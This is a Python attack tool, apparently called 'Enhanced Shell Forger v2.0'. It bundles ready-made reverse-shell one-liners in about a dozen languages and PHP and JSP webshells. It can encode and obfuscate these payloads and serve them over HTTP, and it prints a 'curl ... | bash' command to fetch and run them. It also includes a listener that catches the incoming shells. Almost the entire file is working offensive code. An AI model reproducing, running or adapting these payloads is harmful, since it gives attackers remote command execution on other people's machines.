#!/usr/bin/env python3

print ('''
8""""8                                                                               8""""8                                                                         
8    8 eeee eeee eeee eeeee eeeee    eeeee eeeee  eeeee eeeee eeeee eeee eeeee       8    " eeeee e   e eeeee eeeee eeee eeeee e    e    eeeee eeee    eeeeeee eeee 
8eeee8 8  8 8  8 8    8   " 8   "    8   8 8   8  8   8 8   8   8   8    8   8       8e     8  88 8   8 8   8   8   8    8   " 8    8    8  88 8       8  8  8 8    
88   8 8e   8e   8eee 8eeee 8eeee    8e    8eee8e 8eee8 8e  8   8e  8eee 8e  8       88     8   8 8e  8 8eee8e  8e  8eee 8eeee 8eeee8    8   8 8eee    8e 8  8 8eee 
88   8 88   88   88      88    88    88 "8 88   8 88  8 88  8   88  88   88  8       88   e 8   8 88  8 88   8  88  88      88   88      8   8 88      88 8  8 88   
88   8 88e8 88e8 88ee 8ee88 8ee88    88ee8 88   8 88  8 88  8   88  88ee 88ee8 88    88eee8 8eee8 88ee8 88   8  88  88ee 8ee88   88      8eee8 88      88 8  8 88ee 
                                                                                                                                                                    
''')

import sys
import socket
import http.server
import socketserver
import subprocess
import base64
import urllib.parse
import os

# === COLORS ===
C = {
    'G': '\033[92m',  # Green
    'Y': '\033[93m',  # Yellow
    'R': '\033[91m',  # Red
    'B': '\033[94m',  # Blue
    'C': '\033[96m',  # Cyan
    'W': '\033[1m',   # White/Bold
    'N': '\033[0m',   # None/Reset
}

def log(msg, color='B'):
    print(f"{C.get(color, '')}{msg}{C['N']}")

# === DEPENDENCY CHECK ===
log("[*] Checking dependencies...", "B")
# All tools are Python stdlib - no external deps needed!
log("[✓] All dependencies satisfied!\n", "G")

# === PAYLOAD TEMPLATES ===
PAYLOADS = {
    'bash': "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    'bash_alt': "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    'nc': "nc -e /bin/bash {ip} {port}",
    'nc_pipe': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
    'python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
    'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
    'php': "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
    'perl': "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
    'ruby': "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'powershell': "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    'nodejs': "require('child_process').exec('nc {ip} {port} -e /bin/bash')",
    'golang': "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/s.go && go run /tmp/s.go",
    'webshell_php': "<?php system($_GET['cmd']); ?>",
    'webshell_jsp': "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
}

# === PAYLOAD GENERATION ===
def generate_payload(shell_type, ip, port, encode=None):
    """Generate payload with optional encoding"""
    if shell_type not in PAYLOADS:
        return None
    
    payload = PAYLOADS[shell_type].format(ip=ip, port=port)
    
    if encode == 'base64':
        payload = base64.b64encode(payload.encode()).decode()
        if shell_type in ['bash', 'bash_alt']:
            payload = f"echo {payload} | base64 -d | bash"
        elif shell_type in ['python', 'python3']:
            payload = f"python -c 'import base64; exec(base64.b64decode(\"{payload}\"))'"
    
    elif encode == 'url':
        payload = urllib.parse.quote(payload)
    
    return payload

# === CLIPBOARD COPY ===
def copy_to_clipboard(text):
    """Copy to clipboard (cross-platform)"""
    try:
        # Try pbcopy (macOS)
        subprocess.run(['pbcopy'], input=text.encode(), check=True)
        return True
    except:
        pass
    
    try:
        # Try xclip (Linux)
        subprocess.run(['xclip', '-selection', 'clipboard'], input=text.encode(), check=True)
        return True
    except:
        pass
    
    return False

# === HTTP SERVER ===
class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler for serving payloads"""
    
    def do_GET(self):
        global CURRENT_PAYLOAD
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(CURRENT_PAYLOAD.encode())
        
        log(f"[+] Payload delivered to {self.client_address[0]}", "G")

def serve_payload(payload, port=8000, filename='shell.sh'):
    """Serve payload via HTTP"""
    global CURRENT_PAYLOAD
    CURRENT_PAYLOAD = payload
    
    log(f"\n[*] Starting HTTP server on port {port}...", "B")
    log(f"[*] Payload URL: http://0.0.0.0:{port}/{filename}", "C")
    log(f"[*] Download with: curl http://<YOUR_IP>:{port}/{filename} | bash\n", "Y")
    
    try:
        with socketserver.TCPServer(("", port), PayloadHandler) as httpd:
            httpd.allow_reuse_address = True
            httpd.serve_forever()
    except KeyboardInterrupt:
        log("\n[*] Server stopped", "Y")

# === NETCAT LISTENER ===
def start_listener(port=4444):
    """Start netcat-style listener"""
    log(f"\n[*] Starting listener on port {port}...", "B")
    log(f"[*] Waiting for connection...\n", "Y")
    
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(1)
        
        conn, addr = server.accept()
        log(f"[+] Connection from {addr[0]}:{addr[1]}", "G")
        
        import threading
        
        def receive():
            while True:
                try:
                    data = conn.recv(4096).decode()
                    if not data:
                        break
                    print(data, end='')
                except:
                    break
        
        def send():
            while True:
                try:
                    cmd = input()
                    conn.send((cmd + '\n').encode())
                except:
                    break
        
        # Start threads
        threading.Thread(target=receive, daemon=True).start()
        send()
        
    except KeyboardInterrupt:
        log("\n[*] Listener stopped", "Y")
    finally:
        try:
            conn.close()
            server.close()
        except:
            pass

# === OBFUSCATION ===
def obfuscate_payload(payload, level='medium'):
    """Obfuscate payload"""
    if level == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif level == 'hex':
        return payload.encode().hex()
    elif level == 'rot13':
        import codecs
        return codecs.encode(payload, 'rot13')
    else:
        # Variable name randomization (basic)
        import random
        import string
        var = ''.join(random.choices(string.ascii_lowercase, k=8))
        return payload.replace('socket', var)

# === MAIN ===
def main():
    log("\n--- Enhanced Shell Forger v2.0 ---\n", "W")
    
    if len(sys.argv) < 2:
        log("Usage: ./shell_forger.py <mode> [options]\n", "R")
        log("Modes:", "W")
        print(f"  {C['B']}gen{C['N']}     <ip> <port> [type] [encoding]  - Generate payload")
        print(f"  {C['B']}serve{C['N']}   <ip> <port> [type] [http_port] - Serve payload via HTTP")
        print(f"  {C['B']}listen{C['N']}  <port>                         - Start listener\n")
        
        log("Shell Types:", "W")
        print("  bash, nc, python, python3, php, perl, ruby, powershell, webshell_php\n")
        
        log("Encodings:", "W")
        print("  base64, url, hex, rot13\n")
        
        log("Examples:", "Y")
        print("  ./shell_forger.py gen 10.10.10.10 4444 bash base64")
        print("  ./shell_forger.py serve 10.10.10.10 4444 bash 8000")
        print("  ./shell_forger.py listen 4444\n")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == 'gen':
        if len(sys.argv) < 4:
            log("[!] Usage: gen <ip> <port> [type] [encoding]", "R")
            sys.exit(1)
        
        ip = sys.argv[2]
        port = int(sys.argv[3])
        shell_type = sys.argv[4] if len(sys.argv) > 4 else 'bash'
        encoding = sys.argv[5] if len(sys.argv) > 5 else None
        
        payload = generate_payload(shell_type, ip, port, encoding)
        
        if not payload:
            log(f"[!] Unknown shell type: {shell_type}", "R")
            sys.exit(1)
        
        log(f"[+] Payload ({shell_type}):", "G")
        print(f"\n{payload}\n")
        
        if copy_to_clipboard(payload):
            log("[✓] Copied to clipboard!", "G")
        else:
            log("[!] Clipboard copy failed (install xclip/pbcopy)", "Y")
    
    elif mode == 'serve':
        if len(sys.argv) < 4:
            log("[!] Usage: serve <ip> <port> [type] [http_port]", "R")
            sys.exit(1)
        
        ip = sys.argv[2]
        port = int(sys.argv[3])
        shell_type = sys.argv[4] if len(sys.argv) > 4 else 'bash'
        http_port = int(sys.argv[5]) if len(sys.argv) > 5 else 8000
        
        payload = generate_payload(shell_type, ip, port)
        
        if not payload:
            log(f"[!] Unknown shell type: {shell_type}", "R")
            sys.exit(1)
        
        serve_payload(payload, http_port)
    
    elif mode == 'listen':
        if len(sys.argv) < 3:
            log("[!] Usage: listen <port>", "R")
            sys.exit(1)
        
        port = int(sys.argv[2])
        start_listener(port)
    
    else:
        log(f"[!] Unknown mode: {mode}", "R")
        sys.exit(1)

if __name__ == "__main__":
    main()
